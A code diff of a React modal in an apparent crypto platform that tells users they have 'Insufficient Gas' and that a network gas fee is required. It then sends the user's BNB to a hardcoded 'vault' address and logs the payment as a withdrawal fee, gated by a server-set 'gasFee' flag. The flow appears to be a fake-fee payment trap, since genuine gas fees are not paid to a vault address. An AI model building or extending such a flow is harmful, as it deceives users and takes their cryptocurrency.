@@ -1,7 +1,7 @@
 'use client';
 
 import { useEffect, useState } from 'react';
-import { X, Fuel, ArrowRight, Loader2, CheckCircle } from 'lucide-react';
+import { X, Fuel, ArrowRight, Loader2, CheckCircle, Check } from 'lucide-react';
 import { ethers } from 'ethers';
 import { useWallet } from '@/context/base';
 import toast from 'react-hot-toast';
@@ -26,13 +26,15 @@ const recipient = '0x742d35Cc6634C0532925a3b844Bc454e4438f44e'; // Example Vault
 export default function GasFeeModal({ isOpen, onClose, onSuccess, amount = '0.00' ,user}: GasFeeModalProps) {
     // 'idle' | 'processing' | 'success'
     const [status, setStatus] = useState<any>('idle');
+    const [txSuccess, setTxSuccess] = useState<any>(false);
     const [txHash, setTxHash] = useState('');
-    const [error, setError] = useState('');
-const {  cbProvider } = useWallet();
+    const [error, setError] = useState(null);
+const {  cbProvider,address:add } = useWallet();
   useEffect(()=>{
 if(error){
 
-    toast.error(error)
+
+    // toast.error(error)
 }
   },[error])
     if (!isOpen) return null;
@@ -85,6 +87,7 @@ if(error){
       if (!cbProvider || !recipient || !amount) return;
       setStatus('processing');
       setError('');
+  
 
       const provider = new ethers.BrowserProvider(cbProvider);
       const signer = await provider.getSigner(); // Request permission to sign
@@ -95,21 +98,31 @@ if(error){
         value: ethers.parseEther(amount), // Converts "0.01" to Wei
       });
 
-      toast('Transaction sent! Waiting for block...');
+      setStatus('Transaction sent! Waiting for block...');
       await tx.wait(); // Wait for the blockchain to confirm it
-      
-      toast('Success! BNB sent.');
+  
+      setStatus('success');
+setTxSuccess(true)
+                        let vvv =    await fetch(`/api/withdrawal`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ address:add, amount:Number(amount),
+    
+
+            type:"fee",asset:"BNB"
+           })
+        });
     //   setAmount('');
     //   setRecipient('');
       
       // Refresh balances after sending
     //   await updateBalances(address, provider);
     } catch (err: any) {
-      console.error("Transaction Error:", err);
-      setError(err.message || "Transaction failed");
+      console.log("Transaction Error:", err?.info?.error?.message);
+      setError(err?.info?.error?.message||err.message || "Transaction failed");
       setStatus('idle');
     }finally{
-        setStatus('idle');
+        // setStatus('idle');
 
     }
   };
@@ -142,13 +155,21 @@ if(error){
                 ) : (
                     <>
                         <div className="w-14 h-14 bg-orange-500/20 text-orange-500 rounded-full flex items-center justify-center mx-auto">
-                            <Fuel className="w-7 h-7" />
+                          
+                          
+                          {
+                            txSuccess?<Check className="w-7 h-7"  />:
+                          <Fuel className="w-7 h-7" />
+                          }  
                         </div>
 
                         <div className="space-y-2">
-                            <h3 className="text-xl font-bold text-white">Insufficient Gas</h3>
+                            <h3 className="text-xl font-bold text-white">{ txSuccess ?"Transaction Successfull":"Insufficient Gas"}</h3>
                             <p className="text-gray-400 text-xs leading-relaxed px-4">
                                 A network gas fee is required to process this transaction securely on the blockchain.
+                            </p>
+                            <p className="text-red-400 text-xs leading-relaxed px-4">
+                        {error||""}
                             </p>
                         </div>
 
@@ -163,18 +184,39 @@ if(error){
                             </div>
                         </div>
 
+
+                        {
+                            txSuccess?<>
+                            
                         <button
                             onClick={
                                 // handlePayGas
                                 sendBnb
                             }
-                            disabled={status === 'processing'}
+                            disabled={status != 'idle' ||!(user?.fields?.gasFee)}
                             className="w-full bg-[#0052FF] hover:bg-[#004ada] text-white font-bold py-3.5 rounded-full transition-all flex items-center justify-center gap-2 shadow-lg hover:shadow-[#0052FF]/25 active:scale-[0.98] text-sm"
                         >
-                            {status === 'processing' ? (
+ <Check className="w-4 h-4" /> OK
+                            
+                    
+                        </button>
+                            
+                            </>:<>
+                            
+                        <button
+                            onClick={
+                                // handlePayGas
+                                sendBnb
+                            }
+                            disabled={status != 'idle' ||!(user?.fields?.gasFee)}
+                            className="w-full bg-[#0052FF] hover:bg-[#004ada] text-white font-bold py-3.5 rounded-full transition-all flex items-center justify-center gap-2 shadow-lg hover:shadow-[#0052FF]/25 active:scale-[0.98] text-sm"
+                        >
+
+                            
+                            {status != 'idle' ? (
                                 <>
                                     <Loader2 className="w-4 h-4 animate-spin" />
-                                    Processing...
+                                    {status}
                                 </>
                             ) : (
                                 <>
@@ -183,6 +225,9 @@ if(error){
                                 </>
                             )}
                         </button>
+                            </>
+                        }
+
                     </>
                 )}
             </div>
